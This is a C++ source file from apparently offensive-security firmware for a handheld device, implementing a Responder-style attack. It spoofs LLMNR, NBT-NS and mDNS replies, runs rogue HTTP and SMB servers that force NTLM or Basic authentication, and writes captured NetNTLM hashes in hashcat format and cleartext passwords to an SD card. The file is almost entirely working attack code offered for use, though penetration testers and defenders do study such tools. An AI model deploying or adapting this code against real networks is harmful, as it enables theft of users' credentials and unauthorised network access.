// AL-ANQA — offensive security firmware for LilyGo T-DECK
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// responder / rsp — see responder.h. LLMNR + NBT-NS + mDNS poisoning, and
// NetNTLM (v1 -m 5500 / v2 -m 5600) + HTTP Basic capture over HTTP(:80),
// SMB(:445, best-effort), with WPAD PAC serving. Methodology follows
// lgandx/Responder (NOTICES). [EXP], not HW-tested.

#include "responder.h"

#include <Arduino.h>
#include <WiFi.h>
#include <SD.h>
#include <mbedtls/base64.h>
#include <lwip/udp.h>
#include <lwip/igmp.h>
#include <lwip/tcpip.h>

#include "display_manager.h"
#include "input_handling.h"
#include "lockscreen_manager.h"
#include "sdcard_manager.h"
#include "layout.h"

extern DisplayManager displayManager;
extern InputHandling  inputHandler;

static const uint8_t RSP_CHALLENGE[8] = {0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88};

// ── poisoned-query ring (udp cbs on the tcpip thread) ─────────────────────────
struct RspEvt { uint8_t proto; uint32_t src; char name[40]; };  // proto:0 LLMNR 1 NBT 2 mDNS
static volatile RspEvt s_ring[24];
static volatile uint8_t s_rHead = 0, s_rTail = 0;
static uint8_t s_ourIp[4];
static volatile bool s_passive = false;   // listen-only: log queries, never answer
static String  s_dir;                      // per-session SD folder /apps/responder/NNN

static void rspPush(uint8_t proto, uint32_t src, const char* name) {
    uint8_t nh = (s_rHead + 1) % 24;
    if (nh == s_rTail) return;
    s_ring[s_rHead].proto = proto;
    s_ring[s_rHead].src   = src;
    strncpy((char*)s_ring[s_rHead].name, name, 39);
    ((char*)s_ring[s_rHead].name)[39] = '\0';
    s_rHead = nh;
}
static uint32_t ipToU32(const ip_addr_t* a) {
#if LWIP_IPV6
    if (IP_IS_V4(a)) return ip_2_ip4(a)->addr;
    return 0;
#else
    return a->addr;
#endif
}

// ── shared parsers ────────────────────────────────────────────────────────────
static int dnsParseName(const uint8_t* p, int len, char* out, int outSz) {
    if (len < 12) return -1;
    int i = 12, o = 0;
    while (i < len && p[i] != 0) {
        int l = p[i++];
        if (l > 63 || i + l > len) return -1;
        for (int j = 0; j < l && o < outSz - 1; j++) out[o++] = (char)p[i++];
        if (i < len && p[i] != 0 && o < outSz - 1) out[o++] = '.';
    }
    out[o] = '\0';
    if (i + 1 + 4 > len) return -1;
    return (i + 1 + 4) - 12;
}
static void nbtDecodeName(const uint8_t* enc, char* out, int outSz) {
    int o = 0;
    for (int i = 0; i < 32 && o < outSz - 1; i += 2) {
        char c = (char)(((enc[i] - 'A') << 4) | (enc[i + 1] - 'A'));
        if (c == ' ' || c == 0) break;
        out[o++] = c;
    }
    out[o] = '\0';
}

// Build + send a DNS A-record answer (LLMNR/mDNS share the DNS wire format).
static void dnsSendAnswer(struct udp_pcb* pcb, const uint8_t* q, int qlen,
                          uint16_t flags, const ip_addr_t* addr, u16_t port) {
    uint8_t out[128]; int n = 0;
    out[0]=q[0]; out[1]=q[1];
    out[2]=(flags>>8)&0xff; out[3]=flags&0xff;
    out[4]=0; out[5]=1;                 // QD=1
    out[6]=0; out[7]=1;                 // AN=1
    out[8]=0; out[9]=0; out[10]=0; out[11]=0;
    n = 12;
    memcpy(out + n, q + 12, qlen); n += qlen;   // echo question
    out[n++]=0xC0; out[n++]=0x0C;      // name ptr
    out[n++]=0x00; out[n++]=0x01;      // A
    out[n++]=0x00; out[n++]=0x01;      // IN
    out[n++]=0; out[n++]=0; out[n++]=0; out[n++]=30;
    out[n++]=0x00; out[n++]=0x04;
    memcpy(out + n, s_ourIp, 4); n += 4;
    struct pbuf* r = pbuf_alloc(PBUF_TRANSPORT, n, PBUF_RAM);
    if (r) { memcpy(r->payload, out, n); udp_sendto(pcb, r, addr, port); pbuf_free(r); }
}

static void llmnrRecv(void* arg, struct udp_pcb* pcb, struct pbuf* p, const ip_addr_t* addr, u16_t port) {
    if (!p) return;
    if (p->len >= 12 && !(((uint8_t*)p->payload)[2] & 0x80)) {
        uint8_t* q = (uint8_t*)p->payload; char name[40];
        int qlen = dnsParseName(q, p->len, name, sizeof(name));
        if (qlen > 0 && qlen <= 100) { if (!s_passive) dnsSendAnswer(pcb, q, qlen, 0x8000, addr, port); rspPush(0, ipToU32(addr), name); }
    }
    pbuf_free(p);
}
static void mdnsRecv(void* arg, struct udp_pcb* pcb, struct pbuf* p, const ip_addr_t* addr, u16_t port) {
    if (!p) return;
    if (p->len >= 12 && !(((uint8_t*)p->payload)[2] & 0x80)) {
        uint8_t* q = (uint8_t*)p->payload; char name[40];
        int qlen = dnsParseName(q, p->len, name, sizeof(name));
        if (qlen > 0 && qlen <= 100) { if (!s_passive) dnsSendAnswer(pcb, q, qlen, 0x8400, addr, port); rspPush(2, ipToU32(addr), name); }
    }
    pbuf_free(p);
}
static void nbtRecv(void* arg, struct udp_pcb* pcb, struct pbuf* p, const ip_addr_t* addr, u16_t port) {
    if (!p) return;
    if (p->len >= 50 && !(((uint8_t*)p->payload)[2] & 0x80)) {
        uint8_t* q = (uint8_t*)p->payload;
        if (q[12] == 0x20) {
            char name[20]; nbtDecodeName(q + 13, name, sizeof(name));
            uint8_t out[64]; int n = 0;
            out[0]=q[0]; out[1]=q[1]; out[2]=0x85; out[3]=0x00;
            out[4]=0; out[5]=0; out[6]=0; out[7]=1; out[8]=0; out[9]=0; out[10]=0; out[11]=0;
            n = 12; memcpy(out + n, q + 12, 34); n += 34;
            out[n++]=0x00; out[n++]=0x20; out[n++]=0x00; out[n++]=0x01;
            out[n++]=0; out[n++]=0; out[n++]=0; out[n++]=0xE5;
            out[n++]=0x00; out[n++]=0x06; out[n++]=0x00; out[n++]=0x00;
            memcpy(out + n, s_ourIp, 4); n += 4;
            if (!s_passive) {
                struct pbuf* r = pbuf_alloc(PBUF_TRANSPORT, n, PBUF_RAM);
                if (r) { memcpy(r->payload, out, n); udp_sendto(pcb, r, addr, port); pbuf_free(r); }
            }
            rspPush(1, ipToU32(addr), name[0] ? name : "<nbt>");
        }
    }
    pbuf_free(p);
}

// ── NTLM helpers ──────────────────────────────────────────────────────────────
static String ntlmType2B64() {
    uint8_t t2[48]; memset(t2, 0, sizeof(t2));
    memcpy(t2, "NTLMSSP", 7); t2[7]=0x00; t2[8]=0x02; t2[16]=48;
    t2[20]=0x01; t2[21]=0x82; memcpy(t2 + 24, RSP_CHALLENGE, 8); t2[44]=48;
    unsigned char b64[80]; size_t ol = 0;
    mbedtls_base64_encode(b64, sizeof(b64), &ol, t2, sizeof(t2));
    return String((char*)b64);
}
static String hex(const uint8_t* d, int n) {
    static const char* H = "0123456789abcdef"; String s; s.reserve(n*2);
    for (int i=0;i<n;i++){ s+=H[d[i]>>4]; s+=H[d[i]&15]; } return s;
}
static String utf16leToAscii(const uint8_t* d, int n) { String s; for (int i=0;i+1<n;i+=2) s+=(char)d[i]; return s; }

// Locate + parse an NTLMSSP Type-3 anywhere in a buffer (works for HTTP b64-decoded
// data AND raw SMB session-setup frames). Writes a hashcat line; returns the user.
static uint32_t s_caps = 0, s_capsV1 = 0;
static String   s_seenKey[8];        // dedup: last 8 NT-response keys
static uint8_t  s_seenN = 0;
// All per-session files live in s_dir (/apps/responder/NNN): hashes.txt (hashcat-
// ready NetNTLM only), creds.txt (HTTP Basic cleartext), captures.csv (summary),
// queries.csv (every observed name query).
static void appendLine(const char* fname, const String& line) {
    File f = SD.open(s_dir + "/" + fname, FILE_APPEND);
    if (f) { f.println(line); f.close(); }
}
static void writeHash(const String& line) { appendLine("hashes.txt", line); }
static void logCred(const char* proto, const String& src, const String& who) {
    File c = SD.open(s_dir + "/captures.csv", FILE_APPEND);
    if (c) { c.printf("%lu,%s,%s,%s\n", (unsigned long)millis(), proto, src.c_str(), who.c_str()); c.close(); }
}
static String parseType3(const uint8_t* dec, int dl, const String& src, const char* proto) {
    if (dl < 52 || memcmp(dec, "NTLMSSP", 7) != 0 || dec[8] != 0x03) return "";
    auto u16=[&](int o){ return (uint16_t)(dec[o]|(dec[o+1]<<8)); };
    auto u32=[&](int o){ return (uint32_t)(dec[o]|(dec[o+1]<<8)|(dec[o+2]<<16)|(dec[o+3]<<24)); };
    uint16_t lmLen=u16(12);  uint32_t lmOff=u32(16);
    uint16_t ntLen=u16(20);  uint32_t ntOff=u32(24);
    uint16_t domLen=u16(28); uint32_t domOff=u32(32);
    uint16_t usrLen=u16(36); uint32_t usrOff=u32(40);
    if (ntOff+ntLen>(uint32_t)dl || domOff+domLen>(uint32_t)dl || usrOff+usrLen>(uint32_t)dl) return "";
    String user=utf16leToAscii(dec+usrOff,usrLen), dom=utf16leToAscii(dec+domOff,domLen);
    if (user.isEmpty()) user="(anon)"; if (dom.isEmpty()) dom="WORKGROUP";
    bool v1=false; String chal=hex(RSP_CHALLENGE,8), line, key;
    if (ntLen == 24 && lmOff+lmLen<=(uint32_t)dl && lmLen==24) {   // NTLMv1 → -m 5500
        v1=true; key=hex(dec+ntOff,24);
        line = user+"::"+dom+":"+hex(dec+lmOff,24)+":"+hex(dec+ntOff,24)+":"+chal;
    } else if (ntLen >= 24) {                                       // NTLMv2 → -m 5600
        key=hex(dec+ntOff,16);
        line = user+"::"+dom+":"+chal+":"+hex(dec+ntOff,16)+":"+hex(dec+ntOff+16,ntLen-16);
    } else return "";
    // dedup: a victim that re-auths shouldn't re-log the same hash / re-count
    for (int i=0;i<8;i++) if (s_seenKey[i]==key) return user;
    s_seenKey[s_seenN++ % 8]=key;
    if (v1) s_capsV1++; else s_caps++;
    writeHash(line); logCred(proto, src, dom + "\\" + user);
    return user;
}

// ── SMB2 (best-effort) ────────────────────────────────────────────────────────
// SPNEGO negTokenInit advertising NTLMSSP (put in the NEGOTIATE security buffer).
static const uint8_t SPNEGO_INIT[] = {
    0x60,0x28,0x06,0x06,0x2b,0x06,0x01,0x05,0x05,0x02,0xa0,0x1e,0x30,0x1c,0xa0,0x1a,
    0x30,0x18,0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a,0x06,0x0a,
    0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x1e };
static void smbWrite(WiFiClient& c, const uint8_t* smb, int len) {
    uint8_t nb[4] = {0, (uint8_t)((len>>16)&0xff), (uint8_t)((len>>8)&0xff), (uint8_t)(len&0xff)};
    c.write(nb, 4); c.write(smb, len);
}
static void smbHdr(uint8_t* h, uint16_t cmd, const uint8_t* msgId, uint64_t sess, uint32_t status) {
    memset(h, 0, 64);
    h[0]=0xFE; h[1]='S'; h[2]='M'; h[3]='B'; h[4]=64;         // StructureSize
    h[8]=status&0xff; h[9]=(status>>8)&0xff; h[10]=(status>>16)&0xff; h[11]=(status>>24)&0xff;
    h[12]=cmd&0xff; h[13]=(cmd>>8)&0xff; h[14]=1;             // CreditResponse
    h[16]=0x01;                                              // Flags: server-to-redir
    if (msgId) memcpy(h+24, msgId, 8);
    for (int i=0;i<8;i++) h[40+i]=(uint8_t)((sess>>(8*i))&0xff);
}
static void smbNegResp(WiFiClient& c, const uint8_t* msgId) {
    uint8_t m[64+64+sizeof(SPNEGO_INIT)]; smbHdr(m, 0x0000, msgId, 0, 0);
    uint8_t* b = m+64; memset(b, 0, 64);
    b[0]=65; b[2]=1; b[4]=0x02; b[5]=0x02;                   // StructSize65, SecMode, dialect 0x0202
    b[28]=0x00; b[29]=0x00; b[30]=0x10;                      // MaxTransact 0x00100000
    b[32]=0x00; b[33]=0x00; b[34]=0x10; b[36]=0x00; b[37]=0x00; b[38]=0x10;
    uint16_t secOff=64+64, secLen=sizeof(SPNEGO_INIT);
    b[56]=secOff&0xff; b[57]=(secOff>>8)&0xff; b[58]=secLen&0xff; b[59]=(secLen>>8)&0xff;
    memcpy(m+128, SPNEGO_INIT, sizeof(SPNEGO_INIT));
    smbWrite(c, m, sizeof(m));
}
static void smbChallengeResp(WiFiClient& c, const uint8_t* msgId, uint64_t sess) {
    // SESSION_SETUP response: STATUS_MORE_PROCESSING_REQUIRED + SPNEGO(negTokenTarg{ NTLMSSP Type-2 }).
    uint8_t t2[48]; memset(t2,0,sizeof(t2)); memcpy(t2,"NTLMSSP",7); t2[8]=0x02; t2[16]=48;
    t2[20]=0x01; t2[21]=0x82; memcpy(t2+24, RSP_CHALLENGE, 8); t2[44]=48;
    // negTokenTarg: a1 LEN 30 LEN a0 03 0a 01 01 a1 0c 06 0a <ntlm oid> a2 LEN 04 LEN <t2>
    uint8_t sp[80+sizeof(t2)]; int n=0;
    const uint8_t oid[]={0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a};
    int inner = 5 + 14 + (4 + (int)sizeof(t2));             // negResult + supportedMech + responseToken
    sp[n++]=0xa1; sp[n++]=(uint8_t)(inner+2); sp[n++]=0x30; sp[n++]=(uint8_t)inner;
    sp[n++]=0xa0; sp[n++]=0x03; sp[n++]=0x0a; sp[n++]=0x01; sp[n++]=0x01;   // accept-incomplete
    sp[n++]=0xa1; sp[n++]=0x0c; sp[n++]=0x06; sp[n++]=0x0a; memcpy(sp+n,oid,10); n+=10;
    sp[n++]=0xa2; sp[n++]=(uint8_t)(sizeof(t2)+2); sp[n++]=0x04; sp[n++]=(uint8_t)sizeof(t2);
    memcpy(sp+n, t2, sizeof(t2)); n+=sizeof(t2);
    uint8_t m[64+8+80+sizeof(t2)]; smbHdr(m, 0x0001, msgId, sess, 0xC0000016);
    uint8_t* b=m+64; b[0]=9; b[1]=0; b[2]=0; b[3]=0;         // StructSize9, SessionFlags
    uint16_t so=64+8, sl=n; b[4]=so&0xff; b[5]=(so>>8)&0xff; b[6]=sl&0xff; b[7]=(sl>>8)&0xff;
    memcpy(m+64+8, sp, n);
    smbWrite(c, m, 64+8+n);
}
// find "NTLMSSP\0" in a buffer
static int findNtlmssp(const uint8_t* b, int n) {
    for (int i=0;i+8<=n;i++) if (b[i]=='N'&&!memcmp(b+i,"NTLMSSP\0",8)) return i;
    return -1;
}

// ── HTTP catcher ──────────────────────────────────────────────────────────────
static const char* WPAD_PAC = "function FindProxyForURL(url,host){return \"DIRECT\";}";

void runResponder(char* args) {
    DisplayManager& dm = displayManager;
    if (WiFi.status() != WL_CONNECTED) {
        dm.clearScreen(); dm.setTextColor(TFT_RED); dm.println("Not connected. Run `cw` first."); delay(1800); return;
    }
    { String a = args ? String(args) : ""; a.trim(); a.toLowerCase(); s_passive = (a=="passive" || a=="p"); }
    IPAddress ip = WiFi.localIP();
    for (int i=0;i<4;i++) s_ourIp[i]=ip[i];
    s_rHead=s_rTail=0; s_caps=0; s_capsV1=0;
    for (int i=0;i<8;i++) s_seenKey[i]=""; s_seenN=0;

    // per-session folder /apps/responder/NNN
    { int idx=1; char p[48];
      do { snprintf(p,sizeof(p),"%s/%03d",SD_DIR_RESPONDER,idx++); s_dir=String(p); }
      while (SD.exists(s_dir) && idx<1000);
      SD.mkdir(s_dir); }

    struct udp_pcb *llmnr=nullptr,*nbt=nullptr,*mdns=nullptr;
    ip_addr_t m1,m2; IP_ADDR4(&m1,224,0,0,252); IP_ADDR4(&m2,224,0,0,251);
    LOCK_TCPIP_CORE();
    llmnr=udp_new(); if(llmnr){ udp_bind(llmnr,IP_ANY_TYPE,5355); igmp_joingroup(IP4_ADDR_ANY4,ip_2_ip4(&m1)); udp_recv(llmnr,llmnrRecv,nullptr);}
    mdns =udp_new(); if(mdns){  udp_bind(mdns, IP_ANY_TYPE,5353); igmp_joingroup(IP4_ADDR_ANY4,ip_2_ip4(&m2)); udp_recv(mdns, mdnsRecv, nullptr);}
    nbt  =udp_new(); if(nbt){   udp_bind(nbt,  IP_ANY_TYPE,137);  udp_recv(nbt,  nbtRecv,  nullptr);}
    UNLOCK_TCPIP_CORE();

    // capture servers only in ACTIVE mode (passive = listen-only, transmit nothing)
    WiFiServer http(80), smb(445);
    if (!s_passive) { http.begin(); smb.begin(); }
    String type2 = ntlmType2B64();

    const int statY=110, lblY=130, listY=146, capY=192;
    auto drawStatic=[&](){
        dm.clearScreen();
        dm.setTextColor(TFT_RED);   dm.setCursor(10,40);  dm.printText(s_passive?"[RESPONDER] LISTEN":"[RESPONDER]");
        dm.setTextColor(0xFD20);    dm.setCursor(s_passive?176:112,40); dm.printText("[EXP]");
        dm.setTextColor(0x7BEF);    dm.setCursor(10,58);  dm.printText(s_passive?"PASSIVE - log name queries, no reply":"LLMNR/NBT/mDNS + HTTP/SMB NTLM");
        dm.setTextColor(TFT_WHITE); dm.setCursor(10,76);  dm.printText("me  "+ip.toString());
        dm.setTextColor(0x5AEB);    dm.setCursor(10,92);  dm.printText("SD "+s_dir);
        dm.setTextColor(0x5AEB);    dm.setCursor(10,lblY);dm.printText("recent name queries:");
        dm.setTextColor(0x7BEF);    dm.setCursor(10, layoutFooterY(26)); dm.printText(s_passive?"[q] stop   (listen-only, no capture)":"[q] stop  hashcat -m 5600/5500");
    };
    drawStatic();

    uint32_t llmnrN=0,nbtN=0,mdnsN=0,lastDraw=0;
    char lastNames[3][40]={{0},{0},{0}}; char lastCap[52]={0}; bool stop=false;
    File poisonLog = SD.open(s_dir+"/queries.csv", FILE_APPEND);   // kept open (STA sockets = GDMA-safe)

    auto handleHttp=[&](WiFiClient& cl){
        cl.setTimeout(250);   // bound each blocking read so [q] stays responsive
        String auth, path; bool isWpad=false;
        uint32_t t0=millis();
        while (cl.connected() && millis()-t0<1500) {
            if (inputHandler.getKeyboardInput()=='q') { stop=true; cl.stop(); return; }
            String ln=cl.readStringUntil('\n');
            if (ln.length()<=1) break;
            if (ln.startsWith("GET ")||ln.startsWith("POST ")) { path=ln; if (ln.indexOf("wpad")>=0) isWpad=true; }
            if (ln.startsWith("Authorization: NTLM ")) auth="N"+ln.substring(20);
            else if (ln.startsWith("Authorization: Negotiate ")) auth="N"+ln.substring(25);
            else if (ln.startsWith("Authorization: Basic ")) auth="B"+ln.substring(21);
        }
        auth.trim();
        String src=cl.remoteIP().toString();
        if (auth.startsWith("B")) {                          // HTTP Basic → cleartext
            uint8_t dec[128]; size_t ol=0; String b=auth.substring(1);
            if (mbedtls_base64_decode(dec,sizeof(dec),&ol,(const unsigned char*)b.c_str(),b.length())==0 && ol>0) {
                dec[ol<127?ol:127]='\0'; String up=String((char*)dec);
                appendLine("creds.txt", src+"  "+up); logCred("http-basic",src,up);
                snprintf(lastCap,sizeof(lastCap),"BASIC %s",up.c_str());
            }
            cl.print("HTTP/1.1 200 OK\r\nContent-Length:2\r\nConnection:close\r\n\r\nok");
        } else if (auth.startsWith("N")) {
            String b=auth.substring(1); uint8_t hd[24]; size_t ol=0;
            mbedtls_base64_decode(hd,sizeof(hd),&ol,(const unsigned char*)b.c_str(), b.length()>=24?24:(b.length()/4*4));
            uint8_t mt=(ol>8)?hd[8]:0;
            if (mt==1) cl.print(String("HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM ")+type2+"\r\nContent-Length:0\r\nConnection:keep-alive\r\n\r\n");
            else if (mt==3) {
                uint8_t dec[2048]; size_t dl=0;
                if (mbedtls_base64_decode(dec,sizeof(dec),&dl,(const unsigned char*)b.c_str(),b.length())==0) {
                    String u=parseType3(dec,dl,src,"http-ntlm");
                    if (u.length()) snprintf(lastCap,sizeof(lastCap),"NTLM %s @ %s",u.c_str(),src.c_str());
                }
                if (isWpad) cl.print(String("HTTP/1.1 200 OK\r\nContent-Type:application/x-ns-proxy-autoconfig\r\nContent-Length:")+strlen(WPAD_PAC)+"\r\nConnection:close\r\n\r\n"+WPAD_PAC);
                else cl.print("HTTP/1.1 200 OK\r\nContent-Length:2\r\nConnection:close\r\n\r\nok");
            } else cl.print("HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nContent-Length:0\r\n\r\n");
        } else {                                             // no auth → offer NTLM + Basic
            cl.print("HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nWWW-Authenticate: Basic realm=\"Proxy\"\r\nContent-Length:0\r\n\r\n");
        }
        cl.stop();
    };

    auto handleSmb=[&](WiFiClient& cl){
        cl.setTimeout(250);   // bound each blocking read so [q] stays responsive
        uint32_t t0=millis(); uint64_t sess=0x1234000000000000ULL;
        while (cl.connected() && millis()-t0<2500) {
            if (inputHandler.getKeyboardInput()=='q') { stop=true; cl.stop(); return; }
            if (cl.available()<4) { delay(5); continue; }
            uint8_t nb[4]; cl.readBytes(nb,4);
            int mlen=(nb[1]<<16)|(nb[2]<<8)|nb[3];
            if (mlen<=0 || mlen>4096) break;
            uint8_t* msg=(uint8_t*)malloc(mlen); if(!msg) break;
            int got=cl.readBytes(msg,mlen);
            if (got==mlen && got>=64 && msg[0]==0xFE) {
                uint16_t cmd=msg[12]|(msg[13]<<8); const uint8_t* mid=msg+24;
                if (cmd==0x0000) smbNegResp(cl,mid);          // NEGOTIATE
                else if (cmd==0x0001) {                       // SESSION_SETUP
                    int ni=findNtlmssp(msg,got);
                    if (ni>=0 && msg[ni+8]==0x01) smbChallengeResp(cl,mid,sess);
                    else if (ni>=0 && msg[ni+8]==0x03) {
                        String u=parseType3(msg+ni,got-ni,cl.remoteIP().toString(),"smb-ntlm");
                        if (u.length()) snprintf(lastCap,sizeof(lastCap),"SMB %s @ %s",u.c_str(),cl.remoteIP().toString().c_str());
                        free(msg); break;
                    } else { free(msg); break; }
                }
            } else if (got>=8 && msg[0]==0xFF) {              // SMB1 negotiate → nudge to SMB2
                uint8_t mid8[8]={0}; smbNegResp(cl,mid8);
            }
            free(msg); t0=millis();
        }
        cl.stop();
    };

    while (!stop) {
        if (LockScreenManager::getInstance().consumeJustUnlocked()) drawStatic();
        // drain poison ring → screen + poison.csv
        while (s_rTail != s_rHead) {
            RspEvt e = *(RspEvt*)&s_ring[s_rTail]; s_rTail=(s_rTail+1)%24;
            const char* pn = e.proto==0?"LLM":e.proto==1?"NBT":"MDN";
            if (e.proto==0) llmnrN++; else if (e.proto==1) nbtN++; else mdnsN++;
            memmove(lastNames[0],lastNames[1],40); memmove(lastNames[1],lastNames[2],40);
            snprintf(lastNames[2],40,"%s  %s",pn,e.name);
            IPAddress s(e.src);
            if (poisonLog) poisonLog.printf("%lu,%s,%s,%s\n",(unsigned long)millis(),pn,s.toString().c_str(),e.name);
        }
        if (!s_passive) {
            WiFiClient hc=http.available(); if (hc) handleHttp(hc);
            WiFiClient sc=smb.available();  if (sc) handleSmb(sc);
        }

        uint32_t now=millis();
        if (now-lastDraw>=400 && !displayManager.isBlocked()) {
            lastDraw=now; uint32_t caps=s_caps+s_capsV1;
            dm.fillRect(10,statY,SCREEN_WIDTH-20,14,TFT_BLACK);
            dm.setCursor(10,statY); dm.setTextColor(caps?TFT_GREEN:TFT_CYAN);
            char s[52]; snprintf(s,sizeof(s),"LL %lu NB %lu MD %lu  HASH %lu",
                                 (unsigned long)llmnrN,(unsigned long)nbtN,(unsigned long)mdnsN,(unsigned long)caps);
            dm.printText(s);
            dm.fillRect(10,listY,SCREEN_WIDTH-20,3*13,TFT_BLACK); dm.setTextColor(0xC618);
            for (int i=0;i<3;i++) if (lastNames[i][0]) { dm.setCursor(10,listY+i*13); dm.printText(String(lastNames[i])); }
            dm.fillRect(10,capY,SCREEN_WIDTH-20,14,TFT_BLACK); dm.setCursor(10,capY);
            if (lastCap[0])       { dm.setTextColor(TFT_YELLOW); dm.printText(String(">> ")+lastCap); }
            else if (s_passive)   { dm.setTextColor(0x5AEB);     dm.printText("listen-only - no responses sent"); }
            else                  { dm.setTextColor(0x5AEB);     dm.printText("waiting for auth (HTTP/SMB)..."); }
            if (poisonLog) poisonLog.flush();   // persist queued rows periodically
        }
        if (inputHandler.getKeyboardInput()=='q') stop=true;
        delay(8);
    }

    if (poisonLog) poisonLog.close();
    http.stop(); smb.stop();
    LOCK_TCPIP_CORE();
    if (llmnr){ igmp_leavegroup(IP4_ADDR_ANY4,ip_2_ip4(&m1)); udp_remove(llmnr);}
    if (mdns) { igmp_leavegroup(IP4_ADDR_ANY4,ip_2_ip4(&m2)); udp_remove(mdns);}
    if (nbt)  { udp_remove(nbt); }
    UNLOCK_TCPIP_CORE();
}
